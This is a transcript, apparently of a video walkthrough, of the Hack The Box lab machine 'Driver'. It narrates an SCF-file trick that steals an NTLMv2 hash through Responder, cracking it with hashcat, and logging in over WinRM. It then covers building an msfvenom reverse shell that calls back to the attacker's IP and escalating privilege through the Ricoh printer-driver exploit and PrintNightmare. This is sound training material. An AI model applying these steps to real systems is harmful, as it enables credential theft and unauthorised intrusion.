 what's going on youtube this is ipsec can be doing driver from hack the box which is part of the printer exploitation track designed to teach you skills relevant to attacking printers on a corporate network this box starts off with creating a scf file that is a shell command file and i don't know the true purpose of it i just know this file in particular allows for external icons so you can create one with an icon pointing back to a file server you control and then when anyone opens a folder that this file is in the version of windows may reach back to your server which allows you to steal their ntl and v2 hash i say may because microsoft has started patching this so i definitely get a lot of mixed results with it but because printers generally write to file shares that a lot of people access if there's a unpatched machine chances are you will be able to get their hash and then go on from there once you get the hash in this machine the next step is to private via either print nightmare or you can abuse a ricoh driver that's commonly installed in an enterprise environment so with that being said let's jump in as always we're gonna start off with the nmap so dash sc for default scripts sv enumerate versions oh hey i'll put all formats bring the nmap directory and call it driver and then the ip address of 1010 11.106. this can take some time to run so i've already ran it looking at the results we have three ports open the very first one being http on port 80 and its banner tells us it's an iis web server so we know this is windows the next thing we have is port well i already said port 80 but on the nmap scripts we see it is a mfp firmware update center and mfp probably stands for like multifunctional printer at least that's what i've always heard and then it's also telling us the username of admin we just have to guess the password if i had to guess it's going to be password hp printer something like that it's probably gonna be an easy password because printers are really secured then we have 135 and 445 so it is listening on smb and generally when i see that i like just testing out some basic things so i'll try like smb client dash capital l and then 10 10 11 106 to see if i can list file shares just try the default that doesn't work then do dash capital n for no pass we get access denied dash capital u and i think what i'm doing here is a null authentication by not putting a username i'm not exactly sure i don't remember all this so i kind of do a little bit of trial and error sometimes with the blank sometimes with a period just seeing exactly how it behaves and we get login failures for everything so the next thing i'm going to do is a little crack map exec so cme smb 1010 11 106. and what this tells me is the hostname most likely yep i can see right here the name is going to be driver the domain is driver so chances are this is either a domain controller or it is just a windows box since ldap dns all those ports aren't working i'm going to guess this is standalone it also tells us it's windows 10 enterprise the domain is driver the signing is false the signing if it was in an actual domain may mean something but since it's a standalone box and it's hacked the box there's not other boxes we can't do any like impersonation shenanigans so smb signings not interesting there smbv1 being set to true is interesting however i'm guessing this box has been updated since eternal blue so no real exploit there but we should still tell those people to turn that off and i know crack map exec can test for null authentication like we just did with smb client i just like doing smb client for some reason but i'm at a dead end with enumerating smb so let's test out the website i'm going to go to 10 10 11 106 and try the credentials admin admin first and we get in and we see this is part of a center of excellence and it's a website for testing multifunctional printers and firmware updates and stuff so this is not an actual printer it's something set up by the it team to just test out printers we can see the url does end in php and there is some type of upload form here though but before we go to that i want to just run a go buster against it so go buster dir i'm gonna do dash h because this is authentication so i need to pass capital u and dash capital p for username password so dash u for url oh crap i um highlighted so http 10 10 11 106. and then we said dash capital u for username dash capital p for password and then dash x for extension php uh dash w word list opt sec list uh discovery web raft small words not extensions words dot text and we'll do an out file of just go buster.out so now we have some recon going in the background we can take a look at this and it says select printer model upload respective firmware to our file share our testing team will review updates manually and initiate the testing soon so whenever i think about printers i always try to find out how they're writing to follow share is because a lot of mfps are set up so you can scan the document and that document will go to our user's home directory or go somewhere on a file share so they can retrieve it on their computer and when that happens if you can write to where users scan documents to you can put something called an scf file a shell command file i want to say but the cool thing about this file is it allows for external icons and if you put an external icon that means you can have it go back to um your computer whenever it tries to pull it and steal their ntlm v2 hash because windows loves single sign-on and auto authentication anytime you go to an smb share as that user it attempts to log in with the active credentials so let's take a look at this i'm going to create um attack.scf and we'll paste this in and i just want to put 10 10 11 or 10 10 14 8 which is my ip address and we can just put anything we want here so i'm going to do share slash please subscribe and then i'm going to go into responder and i'm just going to remove the responder database real quick you don't have to do this the reason i'm doing it is it may have hashes cached in it and i want to make sure it displays the hash to the screen that it captures so that's just the easiest way to do it i'm going to do sudo python3 responder.pi we probably specify i ton zero and then the main thing i want to look at is it's running its smb server so servers http smb we could do flags just to only turn this on but it doesn't hurt having all the other ones on by default and now we can go over here and upload the firmware let us go let's see it was um hdb driver attack.scf and when i submit this we can see it uploaded and immediately we get the hash for the tony user so i'm going to go into the kraken and if i go into hashcat it would help if i actually typed it correctly but there we are we are in hash cat i can go v hashes and i'll just call this driver and we can paste the ntlm hash i can just do dot slash cat dot bin um the diction uh the hashes first so hashes driver and then opt word list rockyou.txt just do this really quickly if this fails then i do other word list or um rule files i just like doing without rules first because i like it being super fast and our auto detection is saying it detects against two hashes ntl and v2 and ntl v2 nt i don't know what the nt1 is actually but i'm just going to try ntlm v2 first and that fails i'll try the nd version but i don't think this is gonna fail so it looks like it has successfully cracked it and the password is lil tony we could also have done um dash dash show i believe and it would go into the hashcat.potfile and show everything it cracked so we do have lil tony so let's get out of here and we can test out those credentials so i'm going to do cme smb we have to put a space there 10 10 11 106 dash u tony dash p lil tony and this is going to tell us if we can authenticate and also if it said pwned we would be able to get a shell let me just try shares to see if um there's any open shares that we can use there's not uh we could have also done like smb client dash 10 11 106 and you as tony and do it this way the reason why i like doing crack map exec there is because it shows us the permissions so if we could write something it would tell us um it's going to go back into my normal directory and let's see crack map exec also has a win rm module if we just do dash h it has a lot of different authentications we have ldap microsoft sql smb ssh twin rm um our nmap didn't tell us when rm was open but 59 85 and 5986 are not default ports so that's why it's sometimes handy just do like an all port scan but we can try this real quick 5985 5986 which are when rm ports 10 10 11 106. i'm gonna do dash n to not do any dns resolution and we see 5985 is open so we can try a crack map exec when our m and then 10 10 11 106 dash u tony dash p lil tony and if it says we can pound this we'll be happy if it doesn't then um we'll have to figure out what to do so there we go we have the little pwned flag and my favorite way to get into boxes is use evil winrm for powershell so i can just do slash evil when rm dash i the ip1010116 u username is tony p the password and password is tony um i'm actually going to exit this because there were some things i wanted to do and there is this dash s for scripts path and dash e for exe's path i love having these because when i run like powershell scripts i don't have to drop it to the box i can just type the name so i'm going to makeder and then scripts exes and when i do it like this that's like an expansion thing and it made both of those directories so we can see both scripts and exes are created so now when i run this winram command i can do s scripts dash e exes and if i place things in there i should be able to execute them so the next step is making sure we get the shell and then once we see a command prompt we may want to do something like uh win peas so i'm going to just download a new copy of it so win p's github and it's changed to like the psng library and this changed a few weeks ago i believe or i don't know exactly when and if you want to download it i would highly recommend just going to the releases and downloading what you want i'm gonna do let's see we'll try the win peas any exe it's code in a.net so i never know why dot net binaries have 64 and 32-bit because there's also like pretty sure it compiles without needing uh architecture and we have some error message i did not expect to see that 10 10 11 oh dash p lil tony helps if i type the password correct maybe it helps we'll see i still don't have the prompt as quickly as i wanted but no rush i can just download this one piece any copy the link let me go into opt evil winrm go into exes and w get this and we should be able just to execute it like so not found i wonder if those files have to exist before when rm not found if i type menu this is going to show me eva winner m's menu and i can try like invoke binary win peas check phone names i don't know exactly what this is doing is this not net did he do some weird encoding no it is a net assembly so let's just upload it so if i go to cd backlash program data we can upload the win p's any so let's copy and paste so we don't make typos uh let's do exes win p's any there we go and we have a nice little progress bar of it uploading i'm going to speed up the video here so we're not just watching the grass grow and the upload is successful we can do a dot backslash win psn.exe to execute it and this is going to take a while to run so i'm going to pause the video and we'll just come back when all this is done and there we have it win peas has finished running and the first thing i notice is do you like win peas or do you like peas you should become a patreon here i want to see how many people he has because he definitely deserves all the patrons possible because everyone loves to stool but there's only seven at 18 so definitely after this video i'm going to subscribe to him and i advise you too as well he can also respect him on hack the box i love that he plugs the platform because whenever he does a machine that win piece doesn't find vulnerabilities with he goes and sees if he can add them so most hack-the-box vulnerabilities can be found through win peace so let's go um just search through our history so we can go back to the beginning and there is a lot of output here we see like 6 000 lines and we're at yeah we're at 6 000 so there's like 6 000 lines here of output uh we're probably going to miss things at first glance this is my like why don't like automated recon tools all the time because they kind of flood you with output and something that you may be looking for you just skim over thankfully win peace does do like this color thing so we can see the interesting things to us for example lapse is not enabled i think this is like local account password solution um it randomizes local admins password every like 30 days we have lsa protection connection guard these are things that protect lsas to prevent like mimikaz from stealing your passwords um i think lsa protection just makes it a protected process um so if you're in the kernel you may be able to change that flag or just read the memory anyways it's a lot harder to read protected processes credential guard however i want to say does a lot of hyper-v magic so you have your main os running in a vm and l-sas running in another vm so the main os can't just read it without hyper-v escapes or something like that so there's a lot of cool protections in windows that can be enabled we see no av detection local account token filter policy so i want to say if that's set to zero then local accounts can't be used remotely uh you could read more about it he does post links where things are shouldn't always take exactly what i say as gospel we do see authenticated users can create c colon backslash and this is something that's not good i'm going to test it out real quick or put it in notes create directory and sql and backslash so a lot of organizations will prevent users from writing into sequel and backslash and that's a good security thing because a lot of the service provi uh like the unquoted service path prives that we'll probably see in a little bit um are a lot harder to exploit if you can't write to c colon backslash because how those work is um a lot of services run out of like c colon program files and the unquoted service path thing says oh there's a space here and that c column or program files so before going into the directory it will try to execute like sequel program.exe so if you can create this file then you can abuse those unquoted service pads but generally you need the machine to reboot to do that because you don't have permission to restart the service but that is something that you can certainly do i'm sure if you go to ipsec.rocks you can look at unquoted service pads and find more looking at user information that's going to tell us the users on the box we can see the tokens we don't have like se backup impersonate or any of those dangerous privileges so nothing is highlighted there we can see the local user or the local admin on this box administrator he's enabled it also says things like last login password last set which is good password policy process information again just looking for things that are highlighted in red we have auto run applications let's see it looks like one drive is set to run on startup which isn't uncommon for windows unquoted space detected so this is in start menu so if we could write to windows start.exe we may be able to hijack something but still going through we have so many things we could test for i think this known dll's thing we could probably well i guess it's highlighting because there's a space here and i'm not exactly sure if that is accurate or not win ps doesn't do any validation it's just saying things you should look at so this is a relatively noisy section that i only go to at the very end when i'm at a complete loss we have device drivers so there is a lot of drivers listed i wish i ran this way with less uh dash so it wasn't on line break so i go left and right because it's hard for me to read like this wall of text if it was all on one line it's relatively formatted well so i think would be easier for me to read but we'll see going down we have udp ports firewall windows vault credential manager desktop deep happy keys uh we have app cmd [Music] we must be administrator to run this check we are not so chances are that's not um vulnerable unintended files lull bends hidden files and one of those hidden files is actually interesting we do have a ricoh driver which is a printer and i know just from experience that this driver has a vulnerability in it essentially um its dlls are um writable by everyone and we'll go into exactly how to exploit that in a few minutes but that is i think it for win peas this is just viewing a file and giving us too much data this is by where like a few thousand of those six thousand lines comes from oh god this is a lot there we go we're out of that anaconda mosquito svn windows files files i don't know exactly what that is but the one thing that i also wanted to point out oh we have um another rico thing here at the very bottom but the one thing i want to point out is i know there was a console history here and we just missed it because of all that output and i was specifically looking for this and oh this it's it's right here but it was up higher i think uh let's see yeah powershell settings so ps history file we should always read these when they exist so let's start out here let's type it to read it we have to paste it because i copied a line break it looks like let's see redline and this is what is it host underscore history.txt is that the name of the file let's see console i think i forgot to put a quote there we go so we can see them doing this ad printer printer name reeker driver the um driver name the port name so this is a powershell one liner to add a printer if i go to this um let's see ricoh printer exploit see this is i think the best page for reading about it essentially um you need administrative permissions to add a printer's driver to a computer but you don't need administrative privilege to add a printer to a computer so if the driver exists on the computer then local users can just add it right now the issue with this driver in particular is it put all its dll files writable by everyone so once it installs it writes dlls that are world writable so a regular user can go oh i'm going to edit this driver for the printer and then i'm going to add it and when it adds it it executes what they edited so the whole piece of um that requires administration you can just kind of skip as a user so that is the heart of this exploit i believe and the easiest way to actually exploit it is through metasploit and we're gonna go figure that out uh why and a little bit but it's better to do that through trial and error so i'm gonna do msf console and we want to execute winrm so once i go in here i'm going to search for wenrm things so we can get a shell and this is the module i believe we should use to get a shell and it currently has an issue that i think we're going to try to fix next week because it sounds like a fun thing to do so i'm going to do set lhost 2 ton 0 set l port to 9001 and then let's do set payload to be windows interpreter reverse tcp and i also always like using x64 when it is a 64-bit system just show options to make sure i didn't erase anything uh lhost ton zero show options what oh that would help show options okay and then we just need the username the password so let's do set username tony set password little tony and then run oh we need to tell it what to exploit so set our host 10 10 11 106. now we can run and we see it's invalid credentials we could try doing like um set workstation to be driver because we know that from crack map exec but doesn't do anything so the real like head scratcher for me if i do search winram and we use the scanner the cmd uh used to show options pretty much do the same thing with username password or host and then run it it works and that is the real like confusing thing at first i was like maybe it's using like 59.85 for cmd and it only uses 5986 for the script one let's see u6 let's do that search again search winram you use four not six but we could easily test that if we just do pseudo wireshark listen on ton zero and then exploit this we can see does opposed to ws man here and those are the credentials so it is doing 59.85 um it should be let's see here where's the port this yeah destination port right there 59.85 so we could look at the actual source code of this and figure out why maybe we'll do that at the end of the video i don't want to waste too much time um exploiting it but we can always just do the simple method of msf venom so i'm gonna do msfnml payloads to list all the payloads even though i could have just grabbed it from here because this is the payload we want so we could scroll up and see that what i copied is a valid payload but trust me it is 10 10 14 8 l port is equal to 9001 format is going to be exe out file is going to be msf.exe we don't have to worry about any encoders or av evasion because we saw defender was disabled and now we do have a executable if i do a file against it we see it's there we can just upload it so upload hdb driver msf.exe and while that uploads we can use exploit multi handler and then set uh payload let's see do i not have a payload there we go show options we want lhost l port run and then if i execute msf.exe it's sending the stage and we have session one open i'm gonna type background to background the session we can search for ricoh and we can use the driver private that is here no payload configured defaulting to that i'm just going to do set dash g to make this global i think that's how you do it or maybe it's set g is there a set g i think set g is how you make it global um let's do use one okay using configured i do 0 yeah so now you can see by default it's using the 64-bit version except i switched over is there a gsat no it said g that's where that defaulted back to the non-64 bit i'm not going to worry about that wait set payload windows x64 meterpreter reverse tcp there we go and then the other thing we do i was kind of confused like we should have more information here but no we just set the session if i do sessions dash l we can see the material session is one so l one or sessions set sessions one like that and then we should be able to just run this exploit and hold on show options l host to ton zero now we can run and it says the target appears to be vulnerable it's adding the printer and we don't get anything and the first thing i would probably be doing here is i would switch to a um 32-bit payload because sometimes exploits only work in 32-bit land and other times they only work in 64-bit so we do this msf venom command again except this time we get rid of x64 do msf32 upload it once it's done go back to exploit multihandler have this running and wait for the upload to finish and then we can execute it and try with a 32-bit process there we go dot slash msf32 exe we have wait what it died instantly uh show sessions or session l both those do the same thing but i am confused oh um the multi-handler i have it sending a 64-bit payload so set payload to be windows interpreter or come on interpreter reverse tcp there we go there we go we have session four opened i can background this we go back to the ricoh privesk i can set sessions to four or session i think yep and then we run this it appears to be vulnerable and it's adding a printer but we still hang so that's not it so i'm going to set my session back to one because i always like defaulting to 64-bit and then sessions dash i1 to interact with it and the next thing i'm going to do is change it to be a interactive process so this session uh table here zero is non-interactive meaning it can't interact with the desktop one means it can so i'm gonna try going into explorer so i'm gonna do migrate 2020. and explorer restarted that's weird i'm going to migrate into one drive so migrate 4860 let's see if this one works we have successful migration so now our interpreter is inside of this process if i do get uid or get pid i think our current pit is 49.48 which is this and we are now set to one for interactivity so if i background this and we do run again target appears vulnerable adding the printer and immediately you see it starts sending the stage so this is why it's a pain to exploit this one without uh interpreter because we'd have to do a bunch of stuff to get into a interactive process which is just so easy with uh metasploit i control c that because it seems to be taking a while let's do um sessions dash l we do have five so if i do sessions dash i5 we can probably do cd users and then administrator and we can cat oh we have to go to desktop and then cat root.txt and we can read the file that way we can also do a shell go into a command prompt or download root.text there's so much we can do here with metasploit super super good framework to use um let's see the next thing we wanted to do uh we could have also done print nightmare to privesquare so if i did like impacted rpc dump at the start of this let's do 10 10 11 146 no 106. this will list all the um rpc endpoints and generally when you see ms i thought it was pure n yeah this generally when you see this i believe it's vulnerable to print nightmare maybe if it's patched you can see this and it's not i'm not positive but that's generally how i flag it and we could actually validate the exploit by just googling like print nightmare powershell go to caleb stewart um thing we also see jon hammond had helped with this as well you can do raw to just download this so what i'm going to do will exit out of this shell i'm going to put it in the scripts so w get this we'll copy the file name run evilwinrm again and then if we just paste well before we paste the file name i'm going to do menu so you can see all the things are when rm shell can do i'm going to run this script and it can work because i specified where my scripts directory is this is how i thought the exe would work but we just do this and it should upload and run it it may take a minute now when i do menu again we see all the functions out of it the most important one being invoke nightmare so we can just run this and we see it's adding a user as administrator and deleting the payload if we look at the username it's admin with the one and password so let's exit out of metasploit and we can just do ps exec um adm1n at 10 10 11 106. and put the password of password and success we have gotten a shell so this is the other way we could have done the prevasque now there is one thing i wanted to look at and that is back in metasploit land so if i did msf console let's exit out of this clear up all the sessions i can just do search when rm and we got this winram cmd and winram script exec so i'm going to look at the source code to both of these so vi or we'll do locate first and then vim on that file go to the script exec and do the same exact thing so grab this one and the main thing i want to do is how it logs in so i'm just going to was going to search for login but the better way to do it is search for the username so we have this variable username and let's see where it uses it um wait what username i don't see it i'm doing something silly okay well we see this valid login so we can look at what the function is and we see it's doing a winram wql message and doing the response code that way it's a really weird way to do login here so let's take a look at the one that works this cmd module and i'm going to do the same thing i did let's search for user name and we see the variable user is being passed from that but it's using this net msfwinoram rexwinrm connection to do authentication there's no like valid login in this script at all so i believe this is a newer script and that like script exec is just a really old one that hasn't been updated i don't know the other funny thing is if we do um github search for metasploit let's see go to google and we go over to issues we can search for winrm and there's one for winram script exec that just talks about like um modules old hasn't been maintained why is it using these options plus a million other questions and i'm with this guy i have a lot of questions too so maybe next week i'll try to find time to build an improvement to this module but that'd be it for this video take care guys and i'll see you all next week